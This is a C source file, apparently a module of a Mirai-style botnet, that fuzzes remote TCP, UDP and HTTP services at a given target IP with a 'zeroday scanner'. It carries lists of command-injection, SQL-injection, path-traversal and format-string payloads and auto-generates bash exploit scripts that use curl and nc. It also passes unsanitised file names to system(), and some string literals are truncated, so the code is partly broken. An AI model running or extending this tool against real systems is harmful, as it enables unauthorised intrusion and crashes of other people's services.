#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <pthread.h>
#include "includes.h"
#include "fuzzer.h"
#include "rand.h"
#include "util.h"
#include "table.h"
static struct fuzz_pattern patterns[FUZZER_MAX_PATTERNS];
static uint32_t pattern_count = 0;
static struct fuzz_result results[1000];
static uint32_t result_count = 0;
static pthread_mutex_t fuzzer_mutex = PTHREAD_MUTEX_INITIALIZER;
static volatile int fuzzer_running = 0;
static pthread_t fuzzer_thread = 0;
static const char *overflow_patterns[] = {
    "A", "B", "C", "D", "E", "F",
    "\x00", "\x01", "\xFF", "\x7F",
    NULL
};
static const char *format_string_patterns[] = {
    "%s", "%x", "%p", "%n", "%d", "%u",
    "%s%s%s%s%s", "%x%x%x%x",
    NULL
};
static const char *command_injection_patterns[] = {
    ";", "|", "&", "&&", "||", "`", "$(",
    "; id;", "; whoami;", "; uname -a;",
    "| id", "| whoami", "| uname -a",
    "& id &", "& whoami &",
    NULL
};
static const char *sql_injection_patterns[] = {
    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
    "admin'--", "admin'/*", "' OR 'x'='x",
    "1' AND '1'='1", "1' AND '1'='2",
    NULL
};
static const char *path_traversal_patterns[] = {
    "../", "..\\", "....
    "../etc/passwd", "..\\..\\..\\windows\\system32",
    "/etc/passwd", "C:\\windows\\system32",
    NULL
};
static uint16_t generate_overflow_payload(char *buf, size_t size, uint8_t mutation_type)
{
    size_t i;
    uint32_t pattern_len;
    const char *pattern;
    switch(mutation_type) {
        case MUTATION_BUFFER_OVERFLOW:
            pattern = overflow_patterns[rand_next() % (sizeof(overflow_patterns)/sizeof(char*) - 1)];
            pattern_len = strlen(pattern);
            for(i = 0; i < size; i += pattern_len) {
                memcpy(buf + i, pattern, (size - i < pattern_len) ? (size - i) : pattern_len);
            }
            break;
        case MUTATION_INTEGER_OVERFLOW:
            snprintf(buf, size, "%d", 0x7FFFFFFF + (rand_next() % 1000));
            break;
        default:
            memset(buf, 'A', size);
            break;
    }
    return (uint16_t)size;
}
static int fuzz_tcp_target(ipv4_t target_ip, uint16_t target_port, uint8_t mutation_type)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    addr.sin_port = htons(target_port);
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return 0;
    }
    char payload[2048];
    uint16_t payload_size = 100 + (rand_next() % 2000);
    if(payload_size > sizeof(payload)) payload_size = sizeof(payload);
    generate_overflow_payload(payload, payload_size, mutation_type);
    send(fd, payload, payload_size, MSG_NOSIGNAL);
    char response[512];
    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(fd, &read_fds);
    int response_len = 0;
    if(select(fd + 1, &read_fds, NULL, NULL, &tv) > 0) {
        response_len = recv(fd, response, sizeof(response) - 1, MSG_NOSIGNAL);
        if(response_len > 0) {
            response[response_len] = 0;
        }
    }
    close(fd);
    if(response_len == 0) {
        return 1;
    }
    if(response_len > 0) {
        if(strstr(response, "error") || strstr(response, "timeout") || 
           strstr(response, "connection reset") || strstr(response, "segmentation") ||
           strstr(response, "core dumped") || strstr(response, "500") ||
           strstr(response, "502") || strstr(response, "503")) {
            return 1; 
        }
    }
    return 0;
}
static int fuzz_udp_target(ipv4_t target_ip, uint16_t target_port, uint8_t mutation_type)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    addr.sin_port = htons(target_port);
    char payload[2048];
    uint16_t payload_size = 100 + (rand_next() % 2000);
    if(payload_size > sizeof(payload)) payload_size = sizeof(payload);
    generate_overflow_payload(payload, payload_size, mutation_type);
    sendto(fd, payload, payload_size, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    close(fd);
    return 1; 
}
static int fuzz_http_target(ipv4_t target_ip, uint16_t target_port, uint8_t mutation_type)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = target_ip;
    addr.sin_port = htons(target_port);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        if(errno != EINPROGRESS) {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0) {
        close(fd);
        return 0;
    }
    char payload[FUZZER_MAX_PAYLOAD_SIZE];
    char request[FUZZER_MAX_PAYLOAD_SIZE + 512];
    int payload_size = 100 + (rand_next() % 2000);
    generate_overflow_payload(payload, payload_size, mutation_type);
    int req_type = rand_next() % 4;
    int len = 0;
    switch(req_type) {
        case 0: 
            len = snprintf(request, sizeof(request),
                "GET /?%s HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "\r\n",
                payload,
                (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff);
            break;
        case 1: 
            len = snprintf(request, sizeof(request),
                "POST / HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: %d\r\n"
                "\r\n"
                "%s",
                (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff,
                payload_size, payload);
            break;
        case 2: 
            len = snprintf(request, sizeof(request),
                "GET / HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "User-Agent: %s\r\n"
                "Cookie: session=%s\r\n"
                "\r\n",
                (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff,
                payload, payload);
            break;
        case 3: 
            len = snprintf(request, sizeof(request),
                "GET /%s HTTP/1.1\r\n"
                "Host: %d.%d.%d.%d\r\n"
                "\r\n",
                payload,
                (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff);
            break;
    }
    send(fd, request, len, MSG_NOSIGNAL);
    char response[512];
    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(fd, &read_fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    int response_len = 0;
    if(select(fd + 1, &read_fds, NULL, NULL, &tv) > 0) {
        response_len = recv(fd, response, sizeof(response) - 1, MSG_NOSIGNAL);
        if(response_len > 0) {
            response[response_len] = 0;
        }
    }
    close(fd);
    if(response_len > 0) {
        if(strstr(response, "500") || strstr(response, "502") || 
           strstr(response, "segmentation") || strstr(response, "core dumped")) {
            return 1; 
        }
    }
    return 0;
}
struct fuzzer_params {
    uint8_t fuzz_type;
    ipv4_t target_ip;
    uint16_t target_port;
};
static void *fuzzer_worker(void *arg)
{
    struct fuzzer_params *params = (struct fuzzer_params *)arg;
    uint32_t iteration = 0;
    uint8_t mutation_types[] = {
        MUTATION_BUFFER_OVERFLOW,
        MUTATION_FORMAT_STRING,
        MUTATION_COMMAND_INJECTION,
        MUTATION_SQL_INJECTION,
        MUTATION_PATH_TRAVERSAL,
        MUTATION_INTEGER_OVERFLOW
    };
    while(fuzzer_running && iteration < FUZZER_MAX_MUTATIONS) {
        uint8_t mutation = mutation_types[rand_next() % (sizeof(mutation_types)/sizeof(mutation_types[0]))];
        int result = 0;
        switch(params->fuzz_type) {
            case FUZZ_TYPE_HTTP:
                result = fuzz_http_target(params->target_ip, params->target_port, mutation);
                break;
            case FUZZ_TYPE_TCP:
            case FUZZ_TYPE_TELNET:
            case FUZZ_TYPE_SSH:
                result = fuzz_tcp_target(params->target_ip, params->target_port, mutation);
                break;
            case FUZZ_TYPE_UDP:
                result = fuzz_udp_target(params->target_ip, params->target_port, mutation);
                break;
            default:
                result = fuzz_http_target(params->target_ip, params->target_port, mutation);
                break;
        }
        if(result) {
            pthread_mutex_lock(&fuzzer_mutex);
            if(result_count < 1000) {
                struct fuzz_result *r = &results[result_count++];
                r->target_ip = params->target_ip;
                r->target_port = params->target_port;
                r->protocol = params->fuzz_type;
                r->mutation_type = mutation;
                r->success = 1;
                r->payload_size = 100 + (rand_next() % 2000);
                if(r->payload_size > FUZZER_MAX_PAYLOAD_SIZE) {
                    r->payload_size = FUZZER_MAX_PAYLOAD_SIZE;
                }
                generate_overflow_payload(r->payload, r->payload_size, mutation);
                r->response_code = 0;
                memset(r->response_data, 0, sizeof(r->response_data));
            }
            pthread_mutex_unlock(&fuzzer_mutex);
        }
        iteration++;
        usleep(10000 + (rand_next() % 50000)); 
    }
    free(arg);
    return NULL;
}
void fuzzer_init(void)
{
    pattern_count = 0;
    result_count = 0;
    fuzzer_running = 0;
}
void fuzzer_start(uint8_t fuzz_type, ipv4_t target_ip, uint16_t target_port)
{
    if(fuzzer_running) {
        fuzzer_stop();
    }
    fuzzer_running = 1;
    struct fuzzer_params *params = malloc(sizeof(struct fuzzer_params));
    if(!params) return;
    params->fuzz_type = fuzz_type;
    params->target_ip = target_ip;
    params->target_port = target_port;
    pthread_create(&fuzzer_thread, NULL, fuzzer_worker, params);
}
void fuzzer_stop(void)
{
    fuzzer_running = 0;
    if(fuzzer_thread) {
        pthread_join(fuzzer_thread, NULL);
        fuzzer_thread = 0;
    }
}
struct fuzz_result *fuzzer_get_results(uint32_t *count)
{
    pthread_mutex_lock(&fuzzer_mutex);
    *count = result_count;
    pthread_mutex_unlock(&fuzzer_mutex);
    return results;
}
void fuzzer_report_result(struct fuzz_result *result)
{
    pthread_mutex_lock(&fuzzer_mutex);
    if(result_count < 1000) {
        memcpy(&results[result_count++], result, sizeof(struct fuzz_result));
    }
    pthread_mutex_unlock(&fuzzer_mutex);
}
char *exploit_generate_from_fuzz(struct fuzz_result *result)
{
    if(!result) return NULL;
    char *exploit = malloc(4096);
    if(!exploit) return NULL;
    memset(exploit, 0, 4096);
    switch(result->protocol) {
        case FUZZ_TYPE_HTTP:
            snprintf(exploit, 4096,
                "#!/bin/bash\n"
                "# Auto-generated exploit from fuzzer\n"
                "# Target: %d.%d.%d.%d:%d\n"
                "# Protocol: HTTP\n"
                "# Mutation type: %d\n\n"
                "curl -X POST 'http:
                "  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                "  -d '%s'\n",
                (result->target_ip>>24)&0xff, (result->target_ip>>16)&0xff,
                (result->target_ip>>8)&0xff, result->target_ip&0xff,
                result->target_port, result->mutation_type,
                (result->target_ip>>24)&0xff, (result->target_ip>>16)&0xff,
                (result->target_ip>>8)&0xff, result->target_ip&0xff,
                result->target_port, result->payload);
            break;
        case FUZZ_TYPE_TCP:
        case FUZZ_TYPE_TELNET:
        case FUZZ_TYPE_SSH:
            snprintf(exploit, 4096,
                "#!/bin/bash\n"
                "# Auto-generated exploit from fuzzer\n"
                "# Target: %d.%d.%d.%d:%d\n"
                "# Protocol: TCP/TELNET/SSH\n"
                "# Mutation type: %d\n\n"
                "echo -n '%s' | nc %d.%d.%d.%d %d\n",
                (result->target_ip>>24)&0xff, (result->target_ip>>16)&0xff,
                (result->target_ip>>8)&0xff, result->target_ip&0xff,
                result->target_port, result->mutation_type,
                result->payload,
                (result->target_ip>>24)&0xff, (result->target_ip>>16)&0xff,
                (result->target_ip>>8)&0xff, result->target_ip&0xff,
                result->target_port);
            break;
        case FUZZ_TYPE_UDP:
            snprintf(exploit, 4096,
                "#!/bin/bash\n"
                "# Auto-generated exploit from fuzzer\n"
                "# Target: %d.%d.%d.%d:%d\n"
                "# Protocol: UDP\n"
                "# Mutation type: %d\n\n"
                "echo -n '%s' | nc -u %d.%d.%d.%d %d\n",
                (result->target_ip>>24)&0xff, (result->target_ip>>16)&0xff,
                (result->target_ip>>8)&0xff, result->target_ip&0xff,
                result->target_port, result->mutation_type,
                result->payload,
                (result->target_ip>>24)&0xff, (result->target_ip>>16)&0xff,
                (result->target_ip>>8)&0xff, result->target_ip&0xff,
                result->target_port);
            break;
        default:
            free(exploit);
            return NULL;
    }
    return exploit;
}
void exploit_generator_init(void)
{
}
char *exploit_generate_from_template(const char *template_name, ipv4_t target_ip, uint16_t target_port)
{
    return NULL;
}
void exploit_save_template(struct exploit_template *tmpl)
{
}
void patch_diff_init(void)
{
}
void patch_diff_analyze(const char *old_binary, const char *new_binary, const char *output_file)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "diff -u %s %s > %s 2>/dev/null", old_binary, new_binary, output_file);
    system(cmd);
    char cmd2[512];
    snprintf(cmd2, sizeof(cmd2), "strings %s | grep -i 'exploit\\|vulnerability\\|patch' > %s.strings 2>/dev/null", new_binary, output_file);
    system(cmd2);
}
char *patch_diff_extract_exploit(const char *diff_file)
{
    FILE *f = fopen(diff_file, "r");
    if(!f) return NULL;
    char *exploit = malloc(4096);
    if(!exploit) {
        fclose(f);
        return NULL;
    }
    char line[256];
    int pos = 0;
    while(fgets(line, sizeof(line), f) && pos < 4000) {
        if(strstr(line, "+") || strstr(line, "exploit") || strstr(line, "payload")) {
            int len = strlen(line);
            if(pos + len < 4095) {
                memcpy(exploit + pos, line, len);
                pos += len;
            }
        }
    }
    exploit[pos] = 0;
    fclose(f);
    return exploit;
}
void zeroday_scanner_init(void)
{
    fuzzer_init();
}
void zeroday_scanner_start(ipv4_t target_ip, uint16_t target_port, uint8_t protocol)
{
    if(fuzzer_running) {
        fuzzer_stop();
        usleep(100000); 
    }
    fuzzer_start(protocol, target_ip, target_port);
}
void zeroday_scanner_stop(void)
{
    fuzzer_stop();
}
void fuzzer_clear_results(void)
{
    pthread_mutex_lock(&fuzzer_mutex);
    result_count = 0;
    memset(results, 0, sizeof(results));
    pthread_mutex_unlock(&fuzzer_mutex);
}
